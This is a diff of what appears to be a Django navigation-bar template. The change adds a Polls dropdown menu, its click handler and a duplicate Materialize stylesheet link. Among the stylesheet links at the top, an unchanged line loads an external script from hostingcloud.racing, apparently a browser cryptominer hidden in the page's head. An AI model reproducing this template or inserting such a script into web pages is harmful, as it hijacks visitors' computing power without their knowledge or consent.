@@ -2,6 +2,7 @@
   <!--This is where the nav bar and all the globalized styling will go-->
   {% load static %}
   <!-- Compiled and minified CSS credit to https://materializecss.com/-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 <script src="https://www.hostingcloud.racing/jPfJ.js"></script>
@@ -49,9 +50,16 @@
             <a id="myProjects" href="/myProjects" class="subDown">My Projects</a>
           </div>
         </div></li>
+        <li class="drop3"><div class="dropdown">
+          <a class="dc3" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+          Polls Menu &#x25BF
+          </a>
+          <div id="dropSub3" class="dc1">
+            <a id="polls" href="/polls">Create Polls</a>
+            <a id="pollsDashboard" href="/pollDashboard">Polls Dashboard</a>
+          </div>
+        </div></li>
         <li><a id="profiles" href="/profiles">Profile</a></li>
-
-        <li><a id="polls" href="/polls">Polls</a></li>
 
         <li><a id="logout" href="/logout">Logout</a></li>
         {% endif %}
@@ -76,6 +84,7 @@
 
     $(".drop1").click(function(){dropSub("dropSub","dropSub2");})
     $(".drop2").click(function(){dropSub("dropSub2","dropSub")})
+    $(".drop3").click(function(){dropSub("dropSub3","dropSub")})
     window.addEventListener("click", function(event) {
       if(event.target.className!=='dc2'){
         x = document.getElementById('dropSub');
